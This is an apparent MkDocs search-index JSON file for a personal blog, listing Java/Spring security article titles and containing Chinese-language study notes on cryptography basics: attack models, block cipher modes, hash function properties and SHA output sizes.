{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Index # Hello world This is Longlone's blog Latest articles # articles mtime \u5b89\u5168 - java - JavaWeb\u5b89\u5168-\u6587\u7ae0\u590d\u73b0 - JAVA\u6587\u4ef6\u7cfb\u7edf 2021/08/06 \u5b89\u5168 - java - web - HttpServletResponse 2021/08/06 \u5b89\u5168 - java - web - ServletContext 2021/08/04 \u5b89\u5168 - java - web - HelloServlet 2021/08/03 \u5b89\u5168 - java - spring - HelloSpring 2021/08/02 \u5b89\u5168 - java - web - Tomcat 2021/08/02 \u5b89\u5168 - java - spring - AOP 2021/07/30 \u5b89\u5168 - java - spring - \u4ee3\u7406\u6a21\u5f0f 2021/07/30 \u5b89\u5168 - java - spring - Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e 2021/07/30 \u5b89\u5168 - java - spring - Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e 2021/07/29","title":"Index"},{"location":"#index","text":"Hello world This is Longlone's blog","title":"Index"},{"location":"#latest-articles","text":"articles mtime \u5b89\u5168 - java - JavaWeb\u5b89\u5168-\u6587\u7ae0\u590d\u73b0 - JAVA\u6587\u4ef6\u7cfb\u7edf 2021/08/06 \u5b89\u5168 - java - web - HttpServletResponse 2021/08/06 \u5b89\u5168 - java - web - ServletContext 2021/08/04 \u5b89\u5168 - java - web - HelloServlet 2021/08/03 \u5b89\u5168 - java - spring - HelloSpring 2021/08/02 \u5b89\u5168 - java - web - Tomcat 2021/08/02 \u5b89\u5168 - java - spring - AOP 2021/07/30 \u5b89\u5168 - java - spring - \u4ee3\u7406\u6a21\u5f0f 2021/07/30 \u5b89\u5168 - java - spring - Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e 2021/07/30 \u5b89\u5168 - java - spring - Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e 2021/07/29","title":"Latest articles"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/","text":"\u53cb\u60c5\u94fe\u63a5 # Hacker # syclover # lingze kodosan const27 f4de afkl 0xc4m3l leohearts ljahum other # Y4tacker morrou","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#\u53cb\u60c5\u94fe\u63a5","text":"","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#hacker","text":"","title":"Hacker"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#syclover","text":"lingze kodosan const27 f4de afkl 0xc4m3l leohearts ljahum","title":"syclover"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#other","text":"Y4tacker morrou","title":"other"},{"location":"template/java-Spring/","text":"java spring","title":"java Spring"},{"location":"template/java-web/","text":"- java #","title":"Java web"},{"location":"template/java-web/#--java","text":"","title":"- java"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/","text":"\u5b66\u4e60 Overview # type: folder_brief_live noteOnly: true","title":"\u5b66\u4e60 Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/#\u5b66\u4e60-overview","text":"type: folder_brief_live noteOnly: true","title":"\u5b66\u4e60 Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6/","text":"\u5bc6\u7801\u5b66 Overview # type: folder_brief_live noteOnly: true style: strip","title":"\u5bc6\u7801\u5b66 Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6/#\u5bc6\u7801\u5b66-overview","text":"type: folder_brief_live noteOnly: true style: strip","title":"\u5bc6\u7801\u5b66 Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/","text":"\u603b\u7ed3 # \u4e94\u79cd\u5bc6\u7801\u653b\u51fb\u65b9\u5f0f # \u552f\u5bc6\u6587\u653b\u51fb\uff0c\u5df2\u77e5\u660e\u6587\u653b\u51fb\uff0c\u9009\u62e9\u660e\u6587\u653b\u51fb\uff0c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u9009\u62e9\u6587\u672c\u653b\u51fb \u4fe1\u606f\u4fdd\u969c\u6280\u672f\u6846\u67b6\u4e2d\u653b\u51fb\u65b9\u5f0f # \u88ab\u52a8\u653b\u51fb\uff0c\u4e3b\u52a8\u653b\u51fb\uff0c\u7269\u7406\u4e34\u8fd1\u653b\u51fb\uff0c\u5185\u90e8\u4eba\u5458\u653b\u51fb\uff0c\u8f6f\u786c\u4ef6\u914d\u88c5\u653b\u51fb \u4e94\u79cd\u5206\u7ec4\u5bc6\u7801\u8fd0\u884c\u65b9\u5f0f # ECB \u7535\u5b50\u5bc6\u7801\u672c\uff0cCBC \u5206\u7ec4\u5bc6\u7801\u94fe\u63a5\uff0cCTR \u8ba1\u65f6\u5668\u6a21\u5f0f\uff0cOFB \u8f93\u51fa\u53cd\u9988\uff0cCFB \u5bc6\u7801\u53cd\u9988 \u5bc6\u7801\u7b97\u6cd5\u6784\u6210 # \u660e\u6587\u7a7a\u95f4\uff0c\u5bc6\u6587\u7a7a\u95f4\uff0c\u79d8\u94a5\u7a7a\u95f4\uff0c\u52a0\u5bc6\u7b97\u6cd5\uff0c\u89e3\u5bc6\u7b97\u6cd5 \u5bc6\u7801\u4f53\u5236 # \u5bf9\u79f0\u5bc6\u7801\u4f53\u5236\uff0c\u975e\u5bf9\u79f0\u5bc6\u7801\u4f53\u5236 \u5e8f\u5217\u5bc6\u7801\u5206\u7c7b # \u540c\u6b65\u5e8f\u5217\u5bc6\u7801\uff0c\u81ea\u540c\u6b65\u5e8f\u5217\u5bc6\u7801 \u4fe1\u606f\u5b89\u5168\u7279\u6027 # \u4fdd\u5bc6\u6027\uff0c\u5b8c\u6574\u6027\uff0c\u53ef\u7528\u6027\uff0c\u4e0d\u53ef\u5426\u8ba4\u6027\uff0c\u53ef\u63a7\u6027\uff0c\u53ef\u5ba1\u67e5\u6027 AES\u5bc6\u94a5\u6269\u5c55 # AES\u4e0d\u662fFeistel \u7ed3\u6784\u7b97\u6cd5 # RSA\u80fd\u62b5\u6297\u9009\u62e9\u660e\u6587\u653b\u51fb # AES\u80fd\u62b5\u6297\u5df2\u77e5\u660e\u6587\u653b\u51fb #","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#\u603b\u7ed3","text":"","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#\u4e94\u79cd\u5bc6\u7801\u653b\u51fb\u65b9\u5f0f","text":"\u552f\u5bc6\u6587\u653b\u51fb\uff0c\u5df2\u77e5\u660e\u6587\u653b\u51fb\uff0c\u9009\u62e9\u660e\u6587\u653b\u51fb\uff0c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u9009\u62e9\u6587\u672c\u653b\u51fb","title":"\u4e94\u79cd\u5bc6\u7801\u653b\u51fb\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#\u4fe1\u606f\u4fdd\u969c\u6280\u672f\u6846\u67b6\u4e2d\u653b\u51fb\u65b9\u5f0f","text":"\u88ab\u52a8\u653b\u51fb\uff0c\u4e3b\u52a8\u653b\u51fb\uff0c\u7269\u7406\u4e34\u8fd1\u653b\u51fb\uff0c\u5185\u90e8\u4eba\u5458\u653b\u51fb\uff0c\u8f6f\u786c\u4ef6\u914d\u88c5\u653b\u51fb","title":"\u4fe1\u606f\u4fdd\u969c\u6280\u672f\u6846\u67b6\u4e2d\u653b\u51fb\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#\u4e94\u79cd\u5206\u7ec4\u5bc6\u7801\u8fd0\u884c\u65b9\u5f0f","text":"ECB \u7535\u5b50\u5bc6\u7801\u672c\uff0cCBC \u5206\u7ec4\u5bc6\u7801\u94fe\u63a5\uff0cCTR \u8ba1\u65f6\u5668\u6a21\u5f0f\uff0cOFB \u8f93\u51fa\u53cd\u9988\uff0cCFB \u5bc6\u7801\u53cd\u9988","title":"\u4e94\u79cd\u5206\u7ec4\u5bc6\u7801\u8fd0\u884c\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#\u5bc6\u7801\u7b97\u6cd5\u6784\u6210","text":"\u660e\u6587\u7a7a\u95f4\uff0c\u5bc6\u6587\u7a7a\u95f4\uff0c\u79d8\u94a5\u7a7a\u95f4\uff0c\u52a0\u5bc6\u7b97\u6cd5\uff0c\u89e3\u5bc6\u7b97\u6cd5","title":"\u5bc6\u7801\u7b97\u6cd5\u6784\u6210"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#\u5bc6\u7801\u4f53\u5236","text":"\u5bf9\u79f0\u5bc6\u7801\u4f53\u5236\uff0c\u975e\u5bf9\u79f0\u5bc6\u7801\u4f53\u5236","title":"\u5bc6\u7801\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#\u5e8f\u5217\u5bc6\u7801\u5206\u7c7b","text":"\u540c\u6b65\u5e8f\u5217\u5bc6\u7801\uff0c\u81ea\u540c\u6b65\u5e8f\u5217\u5bc6\u7801","title":"\u5e8f\u5217\u5bc6\u7801\u5206\u7c7b"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#\u4fe1\u606f\u5b89\u5168\u7279\u6027","text":"\u4fdd\u5bc6\u6027\uff0c\u5b8c\u6574\u6027\uff0c\u53ef\u7528\u6027\uff0c\u4e0d\u53ef\u5426\u8ba4\u6027\uff0c\u53ef\u63a7\u6027\uff0c\u53ef\u5ba1\u67e5\u6027","title":"\u4fe1\u606f\u5b89\u5168\u7279\u6027"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#aes\u5bc6\u94a5\u6269\u5c55","text":"","title":"AES\u5bc6\u94a5\u6269\u5c55"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#aes\u4e0d\u662ffeistel-\u7ed3\u6784\u7b97\u6cd5","text":"","title":"AES\u4e0d\u662fFeistel \u7ed3\u6784\u7b97\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#rsa\u80fd\u62b5\u6297\u9009\u62e9\u660e\u6587\u653b\u51fb","text":"","title":"RSA\u80fd\u62b5\u6297\u9009\u62e9\u660e\u6587\u653b\u51fb"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%80%BB%E7%BB%93/#aes\u80fd\u62b5\u6297\u5df2\u77e5\u660e\u6587\u653b\u51fb","text":"","title":"AES\u80fd\u62b5\u6297\u5df2\u77e5\u660e\u6587\u653b\u51fb"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E7%BB%AA%E8%AE%BA/","text":"\u7eea\u8bba # \u5bc6\u7801\u5206\u6790\u65b9\u6cd5 # \u7a77\u4e3e\u6cd5 \u5bc6\u7801\u5206\u6790\u8005\u8bd5\u56fe\u8bd5\u904d\u6240\u6709\u7684\u660e\u6587\u6216\u5bc6\u94a5\u6765\u8fdb\u884c\u7834\u8bd1\u3002 \u7edf\u8ba1\u5206\u6790\u6cd5 \u5bc6\u7801\u5206\u6790\u8005\u901a\u8fc7\u5206\u6790\u5bc6\u6587\u3001\u660e\u6587\u548c\u5bc6\u94a5\u7684\u7edf\u8ba1\u89c4\u5f8b\u6765\u8fbe\u5230\u7834\u8bd1\u5bc6\u7801\u6280\u672f\u3002 \u5bc6\u7801\u4f53\u5236\u5206\u6790\u6cd5 \u6839\u636e\u6240\u638c\u63e1\u7684\u660e\u6587\u3001\u5bc6\u6587\u7684\u6709\u5173\u4fe1\u606f\uff0c\u901a\u8fc7\u6570\u5b66\u6c42\u89e3\u7684\u65b9\u6cd5\u627e\u5230\u76f8\u5e94\u7684\u52a0\u89e3\u5bc6\u7b97\u6cd5\u3002 \u5bc6\u7801\u4f53\u5236\u5206\u7c7b # \u5206\u7ec4\u5bc6\u7801\u4f53\u5236 \u5bc6\u6587\u4ec5\u4e0e\u52a0\u5bc6\u7b97\u6cd5\u548c\u5bc6\u94a5\u6709\u5173\uff0c\u800c\u4e0e\u88ab\u52a0\u5bc6\u7684\u660e\u6587\u5206\u7ec4\u5728\u6574\u4e2a\u660e\u6587\u4e2d\u7684\u4f4d\u7f6e\u65e0\u5173 \u5e8f\u5217\u5bc6\u7801\u4f53\u5236 \u5bc6\u6587\u4e0d\u4ec5\u4e0e\u7ed9\u5b9a\u7684\u52a0\u5bc6\u7b97\u6cd5\u548c\u5bc6\u94a5\u6709\u5173\uff0c\u800c\u4e0e\u5f53\u524d\u6b63\u88ab\u52a0\u5bc6\u7684\u660e\u6587\u90e8\u5206\u5728\u6574\u4e2a\u660e\u6587\u4e2d\u7684\u4f4d\u7f6e\u6709\u5173 \u5bc6\u7801\u4f53\u5236\u653b\u51fb\u65b9\u6cd5 # \u60df\u5bc6\u6587\u653b\u51fb\uff1a\u5bc6\u7801\u5206\u6790\u8005\u4ec5\u77e5\u9053\u4e24\u6837\u4e1c\u897f\uff1a\u5f85\u7834\u8bd1\u7684\u4e00\u4e9b\u5bc6\u6587\u548c\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5e76\u8bd5\u56fe\u6062\u590d\u5c3d\u53ef\u80fd\u591a\u7684\u660e\u6587\uff0c\u5e76\u8fdb\u4e00\u6b65\u63a8\u5bfc\u51fa\u5bc6\u94a5\u3002 \u5df2\u77e5\u660e\u6587\u653b\u51fb\uff1a\u5bc6\u7801\u5206\u6790\u8005\u4e0d\u4ec5\u77e5\u9053\u4e00\u4e9b\u5f85\u7834\u8bd1\u7684\u5bc6\u6587\u548c\u52a0\u5bc6\u7b97\u6cd5\uff0c\u800c\u4e14\u8fd8\u77e5\u9053\u4e0e\u4e4b\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u6839\u636e\u660e\u6587\u548c\u5bc6\u6587\u5bf9\u8bd5\u56fe\u7834\u89e3\u5f85\u7834\u8bd1\u7684\u5bc6\u6587\u6216\u63a8\u5bfc\u51fa\u5bc6\u94a5\u3002 \u9009\u62e9\u660e\u6587\u653b\u51fb\uff1a\u5bc6\u7801\u5206\u6790\u8005\u77e5\u9053\u4e00\u4e9b\u5f85\u7834\u8bd1\u7684\u5bc6\u6587\u548c\u52a0\u5bc6\u7b97\u6cd5\uff0c\u8fd8\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u660e\u6587\uff0c\u5e76\u5f97\u5230\u76f8\u5e94\u7684\u5bc6\u6587\uff0c\u8bd5\u56fe\u7834\u89e3\u5f85\u7834\u8bd1\u7684\u5bc6\u6587\u6216\u63a8\u5bfc\u51fa\u5bc6\u94a5\u3002 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \u9009\u62e9\u6587\u672c\u653b\u51fb \u73b0\u4ee3\u5bc6\u7801\u5b66\u5206\u7c7b #","title":"\u7eea\u8bba"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E7%BB%AA%E8%AE%BA/#\u7eea\u8bba","text":"","title":"\u7eea\u8bba"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E7%BB%AA%E8%AE%BA/#\u5bc6\u7801\u5206\u6790\u65b9\u6cd5","text":"\u7a77\u4e3e\u6cd5 \u5bc6\u7801\u5206\u6790\u8005\u8bd5\u56fe\u8bd5\u904d\u6240\u6709\u7684\u660e\u6587\u6216\u5bc6\u94a5\u6765\u8fdb\u884c\u7834\u8bd1\u3002 \u7edf\u8ba1\u5206\u6790\u6cd5 \u5bc6\u7801\u5206\u6790\u8005\u901a\u8fc7\u5206\u6790\u5bc6\u6587\u3001\u660e\u6587\u548c\u5bc6\u94a5\u7684\u7edf\u8ba1\u89c4\u5f8b\u6765\u8fbe\u5230\u7834\u8bd1\u5bc6\u7801\u6280\u672f\u3002 \u5bc6\u7801\u4f53\u5236\u5206\u6790\u6cd5 \u6839\u636e\u6240\u638c\u63e1\u7684\u660e\u6587\u3001\u5bc6\u6587\u7684\u6709\u5173\u4fe1\u606f\uff0c\u901a\u8fc7\u6570\u5b66\u6c42\u89e3\u7684\u65b9\u6cd5\u627e\u5230\u76f8\u5e94\u7684\u52a0\u89e3\u5bc6\u7b97\u6cd5\u3002","title":"\u5bc6\u7801\u5206\u6790\u65b9\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E7%BB%AA%E8%AE%BA/#\u5bc6\u7801\u4f53\u5236\u5206\u7c7b","text":"\u5206\u7ec4\u5bc6\u7801\u4f53\u5236 \u5bc6\u6587\u4ec5\u4e0e\u52a0\u5bc6\u7b97\u6cd5\u548c\u5bc6\u94a5\u6709\u5173\uff0c\u800c\u4e0e\u88ab\u52a0\u5bc6\u7684\u660e\u6587\u5206\u7ec4\u5728\u6574\u4e2a\u660e\u6587\u4e2d\u7684\u4f4d\u7f6e\u65e0\u5173 \u5e8f\u5217\u5bc6\u7801\u4f53\u5236 \u5bc6\u6587\u4e0d\u4ec5\u4e0e\u7ed9\u5b9a\u7684\u52a0\u5bc6\u7b97\u6cd5\u548c\u5bc6\u94a5\u6709\u5173\uff0c\u800c\u4e0e\u5f53\u524d\u6b63\u88ab\u52a0\u5bc6\u7684\u660e\u6587\u90e8\u5206\u5728\u6574\u4e2a\u660e\u6587\u4e2d\u7684\u4f4d\u7f6e\u6709\u5173","title":"\u5bc6\u7801\u4f53\u5236\u5206\u7c7b"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E7%BB%AA%E8%AE%BA/#\u5bc6\u7801\u4f53\u5236\u653b\u51fb\u65b9\u6cd5","text":"\u60df\u5bc6\u6587\u653b\u51fb\uff1a\u5bc6\u7801\u5206\u6790\u8005\u4ec5\u77e5\u9053\u4e24\u6837\u4e1c\u897f\uff1a\u5f85\u7834\u8bd1\u7684\u4e00\u4e9b\u5bc6\u6587\u548c\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5e76\u8bd5\u56fe\u6062\u590d\u5c3d\u53ef\u80fd\u591a\u7684\u660e\u6587\uff0c\u5e76\u8fdb\u4e00\u6b65\u63a8\u5bfc\u51fa\u5bc6\u94a5\u3002 \u5df2\u77e5\u660e\u6587\u653b\u51fb\uff1a\u5bc6\u7801\u5206\u6790\u8005\u4e0d\u4ec5\u77e5\u9053\u4e00\u4e9b\u5f85\u7834\u8bd1\u7684\u5bc6\u6587\u548c\u52a0\u5bc6\u7b97\u6cd5\uff0c\u800c\u4e14\u8fd8\u77e5\u9053\u4e0e\u4e4b\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u6839\u636e\u660e\u6587\u548c\u5bc6\u6587\u5bf9\u8bd5\u56fe\u7834\u89e3\u5f85\u7834\u8bd1\u7684\u5bc6\u6587\u6216\u63a8\u5bfc\u51fa\u5bc6\u94a5\u3002 \u9009\u62e9\u660e\u6587\u653b\u51fb\uff1a\u5bc6\u7801\u5206\u6790\u8005\u77e5\u9053\u4e00\u4e9b\u5f85\u7834\u8bd1\u7684\u5bc6\u6587\u548c\u52a0\u5bc6\u7b97\u6cd5\uff0c\u8fd8\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u660e\u6587\uff0c\u5e76\u5f97\u5230\u76f8\u5e94\u7684\u5bc6\u6587\uff0c\u8bd5\u56fe\u7834\u89e3\u5f85\u7834\u8bd1\u7684\u5bc6\u6587\u6216\u63a8\u5bfc\u51fa\u5bc6\u94a5\u3002 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \u9009\u62e9\u6587\u672c\u653b\u51fb","title":"\u5bc6\u7801\u4f53\u5236\u653b\u51fb\u65b9\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E7%BB%AA%E8%AE%BA/#\u73b0\u4ee3\u5bc6\u7801\u5b66\u5206\u7c7b","text":"","title":"\u73b0\u4ee3\u5bc6\u7801\u5b66\u5206\u7c7b"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/","text":"Hash\u51fd\u6570 # \u6982\u8ff0 # HASH\u51fd\u6570\u53c8\u79f0\u4e3a\u54c8\u5e0c\u51fd\u6570\u3001Hash\u51fd\u6570\u3001\u6742\u51d1\u51fd\u6570\u548c\u6563\u5217\u51fd\u6570\uff0c\u5728\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e2d\u626e\u6f14\u7740\u91cd\u8981\u89d2\u8272\u3002 Hash\u51fd\u6570\u662f\u4e00\u516c\u5f00\u51fd\u6570\uff0c\u901a\u5e38\u8bb0\u4e3aH\u6216h\uff0c\u672c\u7ae0\u8282\u4e2d\u4f7f\u7528H\u8868\u793aHash\u51fd\u6570\u3002Hash\u51fd\u6570\u53ef\u4ee5\u5c06\u4efb\u610f\u957f\u7684\u6d88\u606fm\u6620\u5c04\u4e3a\u8f83\u77ed\u7684\u3001\u56fa\u5b9a\u957f\u5ea6\u7684\u4e00\u4e2a\u503c\uff0c\u8bb0\u4e3a\ud835\udc3b(\ud835\udc5a)\uff0c\u7ecf\u5e38\u79f0\u51fd\u6570\u503c\ud835\udc6f(\ud835\udc8e)\u4e3a\u6563\u5217\u503c\u3001\u54c8\u5e0c\u503c\u3001\u6742\u51d1\u503c\u3001\u6742\u51d1\u7801\u6216\u6d88\u606f\u6458\u8981\u3001\u6570\u5b57\u6307\u7eb9\uff0c\u672c\u7ae0\u8282\u4e2d\uff0c\u51fd\u6570\u503c\ud835\udc3b(\ud835\udc5a)\u7684\u503c\u79f0\u4e3a\u54c8\u5e0c\u503c\u3002 \u4ece\u5bc6\u7801\u7b97\u6cd5\u89d2\u5ea6\u770b\uff0cHash\u51fd\u6570\u4e5f\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u79cd\u5355\u5411\u5bc6\u7801\u4f53\u5236\uff0c\u5373\u5b83\u4ece\u4e00\u4e2a\u660e\u6587\u5230\u5bc6\u6587\u662f\u4e0d\u53ef\u9006\u6620\u5c04\uff0c\u53ea\u6709\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u4e0d\u80fd\u89e3\u5bc6\u3002 \u54c8\u5e0c\u503c\u662f\u6d88\u606f\u4e2d\u6240\u6709\u6bd4\u7279\u7684\u51fd\u6570\uff0c\u56e0\u6b64\u63d0\u4f9b\u4e86\u4e00\u79cd\u9519\u8bef\u68c0\u6d4b\u80fd\u529b\uff0c\u5373\u6539\u53d8\u6d88\u606f\u4e2d\u4efb\u4f55\u4e00\u4e2a\u6bd4\u7279\u6216\u51e0\u4e2a\u6bd4\u7279\u90fd\u4f1a\u4f7f\u54c8\u5e0c\u503c\u53d1\u751f\u6539\u53d8\u3002\u5728\u5bc6\u7801\u5b66\u548c\u6570\u636e\u5b89\u5168\u6280\u672f\u4e2d\uff0cHash\u51fd\u6570\u662f\u5b9e\u73b0\u6709\u6548\u3001\u5b89\u5168\u53ef\u9760\u6570\u5b57\u7b7e\u540d\u548c\u8ba4\u8bc1\u7684\u91cd\u8981\u5de5\u5177\uff0c\u662f\u5b89\u5168\u8ba4\u8bc1\u534f\u8bae\u4e2d\u7684\u91cd\u8981\u6a21\u5757\u3002 \u54c8\u5e0c\u51fd\u6570\u8981\u6c42 # \u5bf9\u4e8eH\u6709\u4e0b\u9762\u516d\u4e2a\u8981\u6c42\uff1a 1. \u80fd\u591f\u63a5\u53d7\u4efb\u610f\u957f\u5ea6\u7684\u6d88\u606f\u4f5c\u4e3a\u8f93\u5165\uff1b 2. \u80fd\u591f\u751f\u6210\u8f83\u77ed\u7684\u56fa\u5b9a\u957f\u5ea6\u7684\u8f93\u51fa\uff1b 3. \u5bf9\u4efb\u4f55\u6d88\u606f\u8f93\u5165\u90fd\u80fd\u591f\u5bb9\u6613\u548c\u5feb\u901f\u5730\u8ba1\u7b97\u51fa\u54c8\u5e0c\u503c\uff1b 4. \u5e94\u8be5\u5177\u6709\u5355\u5411\u6027\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u7ed9\u5b9a\ud835\udc3b(\ud835\udc5a)\uff0c\u6062\u590d\u6d88\u606fm\u5728\u8ba1\u7b97\u4e0a\u662f\u4e0d\u53ef\u884c\u7684\uff1b 5. \u5e94\u8be5\u80fd\u591f\u62b5\u6297\u5f31\u78b0\u649e\uff0c\u5373\u7ed9\u5b9a\u6d88\u606fm\u548c\ud835\udc3b(\ud835\udc5a)\uff0c\u627e\u5230\u53e6\u5916\u4e00\u4e2a\u6d88\u606f\ud835\udc5a\u2260\ud835\udc5a \u2032\uff0c\u4f7f\ud835\udc3b(\ud835\udc5a)=\ud835\udc3b(\ud835\udc5a \u2032)\u662f\u4e0d\u53ef\u80fd\uff1b 6. \u5e94\u8be5\u80fd\u591f\u62b5\u6297\u5f3a\u51b2\u7a81\uff0c\u5373\u53ef\u4ee5\u4e24\u4e2a\u6709\u610f\u4e49\u7684\u6d88\u606fm\u548c\ud835\udc5a \u2032\uff0c\u4f7f\u5f97\ud835\udc3b(\ud835\udc5a)=\ud835\udc3b(\ud835\udc5a \u2032)\u51e0\u4e4e\u662f\u4e0d\u53ef\u80fd\u7684\u3002 \u54c8\u5e0c\u51fd\u6570\u7279\u6027 # \u5355\u5411\u6027\uff08\u6297\u539f\u50cf\uff09\uff1a\u5bf9\u5e72\u4efb\u610f\u7ed9\u5b9a\u7684\u6d88\u606f\uff0c\u8ba1\u7b97\u5176\u54c8\u5e0c\u503c\u5bb9\u6613. \u4f46\u662f\uff0c\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u54c8\u5e0c\u503ch\uff0c\u8981\u627e\u5230M\u4f7f\u5f97H(M)\uff1dh\u5728\u8ba1\u7b97\u4e0a\u662f\u4e0d\u53ef\u884c\u7684. \u5f31\u6297\u78b0\u649e\uff08\u6297\u4e8c\u6b21\u539f\u50cf\uff09\uff1a\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u6d88\u606fM1\uff0c\u8981\u53d1\u73b0\u53e6\u4e00\u4e2a\u6d88\u606fM2\uff0c\u6ee1\u8db3H( M1 )\uff1dH(M2)\u5728\u8ba1\u7b97\u4e0a\u662f\u4e0d\u53ef\u884c\u7684. \u5f3a\u6297\u78b0\u649e\uff1a\u627e\u4efb\u610f\u4e00\u5bf9\u4e0d\u540c\u7684\u6d88\u606fM1\uff0cM2 \uff0c\u4f7fH(M1)\uff1dH(M2 )\u5728\u8ba1\u7b97\u4e0a\u662f\u4e0d\u53ef\u884c\u7684. \u968f\u673a\u6027 SHA\u7cfb\u5217 # SHA-1\uff0cSHA-256\uff0cSHA-384\uff0cSHA-512 SHA-1\uff0cSHA-256\u7684\u5206\u7ec4\u5927\u5c0f\u662f512 SHA-384\uff0cSHA-512\u7684\u5206\u7ec4\u5927\u5c0f\u662f1024 SHA-1\u8f93\u51fa\u7684\u6458\u8981\u662f160bit SHA-256\u8f93\u51fa\u7684\u6458\u8981\u662f256 bit SHA-384\u8f93\u51fa\u7684\u6458\u8981\u662f384 bit SHA-512\u8f93\u51fa\u7684\u6458\u8981\u662f512 bit SHA-1 # NIST\u57281993\u5e74\u53d1\u5e03\u4e86\u4e00\u4e2a\u54c8\u5e0c\u7b97\u6cd5\u79f0\u4e3a\u5b89\u5168HASH\u7b97\u6cd5\uff0c1995\u5e74\u4fee\u6539\uff0c\u4fee\u6539\u540e\u7684\u7248\u672c\u662fSHA-1\uff0c\u8fd9\u4e2a\u7248\u672c\u662f\u5f53\u524d\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u54c8\u5e0c\u7b97\u6cd5\u3002 SHA-1\u63a5\u53d7\u8f93\u5165\u6d88\u606f\u7684\u6700\u5927\u957f\u5ea6\u4e3a264-1 bits\uff0c\u751f\u6210160 bits\u7684\u6d88\u606f\u6458\u8981\u3002 